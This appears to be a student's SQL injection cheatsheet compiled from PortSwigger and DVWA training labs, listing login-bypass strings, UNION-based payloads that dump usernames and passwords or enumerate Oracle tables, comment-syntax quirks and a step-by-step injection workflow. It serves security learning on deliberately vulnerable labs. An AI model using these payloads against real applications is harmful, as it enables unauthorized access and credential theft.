# SQL Injection Payload Cheatsheet

*Compiled Week 5, Day 3 — PortSwigger (Oracle) + DVWA High (MySQL)*

---

## 1. Authentication Bypass

| Goal | Payload | Notes |
|---|---|---|
| Bypass login, no known user | `' OR '1'='1'--` (MySQL) / `' OR '1'='1` (Oracle, no trailing comment needed if quote is closed) | Makes WHERE clause always true |
| Bypass login as specific known user | `administrator'--` | Closes username string early, comments out password check |

---

## 2. Boolean-Based Data Retrieval (WHERE clause)

| Goal | Payload | Notes |
|---|---|---|
| Reveal hidden/filtered rows | `' or '1'='1` | Works when input lands inside a `WHERE category = '...'` style clause |
| Confirm injection point exists | `'` (single quote alone) | Error or broken response confirms unsanitized input |

---

## 3. UNION-Based Extraction

**Step 1 — Find column count** (try increasing until it errors):
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- errors here = 2 columns confirmed
```

**Step 2 — Find which column(s) accept strings:**
```sql
' UNION SELECT 'a','a' FROM dual--     -- Oracle (FROM clause required)
' UNION SELECT 'a','a'#                -- MySQL
```
No error = that column accepts string data.

**Step 3 — Extract real data:**

| DBMS | Goal | Payload |
|---|---|---|
| Oracle | DB version | `' UNION SELECT banner, NULL FROM v$version--` |
| Oracle | Table names | `' UNION SELECT table_name, NULL FROM all_tables--` |
| MySQL | Dump credentials | `' UNION SELECT user, password FROM users#` |
| MySQL | Combine multiple rows into one | `' UNION SELECT GROUP_CONCAT(first_name), GROUP_CONCAT(password) FROM users--` |

`NULL` is used as a filler when you only need one real column of data but must match the original column count.

---

## 4. Comment Syntax — Gotchas by DBMS

| DBMS | Comment style | Gotcha |
|---|---|---|
| MySQL | `-- ` (requires trailing space) or `#` (no space needed) | If `--` gets its trailing space stripped (session storage, trimming, URL handling), the query throws a syntax error. **Prefer `#` when `--` misbehaves.** |
| Oracle | `--` | No trailing-space requirement in the labs tested |

**Debugging insight:** A SQL syntax error can surface as a blank *500 Internal Server Error* instead of a visible DB error message — on PHP 8+, an uncaught mysqli exception can bypass an app's intended `die('Something went wrong')` handling. If a payload 500s but a structurally similar one doesn't, suspect a trailing-character/syntax issue (like a missing comment-space) before assuming the injection logic itself is wrong.

---

## 5. Diagnostic Workflow (apply to any new injection point)

1. Inject a single `'` — does the response change/error? Confirms injection point.
2. Determine column count with `ORDER BY` (increment until error).
3. Determine string-compatible column(s) with `UNION SELECT 'a','a',...`.
4. Identify the DBMS (error messages, required `FROM` clause behavior — Oracle needs one, MySQL doesn't).
5. Build the final UNION/boolean payload using the confirmed column count and type.
6. If query errors out unexpectedly, check comment syntax (`--` vs `#`) before assuming the logic is wrong.

---

## 6. Labs Solved (reference)

- PortSwigger Apprentice — Retrieve hidden data (`' or '1'='1`)
- PortSwigger Apprentice — Login bypass (`administrator'--`)
- PortSwigger Practitioner — UNION attack, DB version on Oracle (`' UNION SELECT banner, NULL FROM v$version--`)
- DVWA High — SQLi via session-stored input, MySQL (`' UNION SELECT user, password FROM users#`)
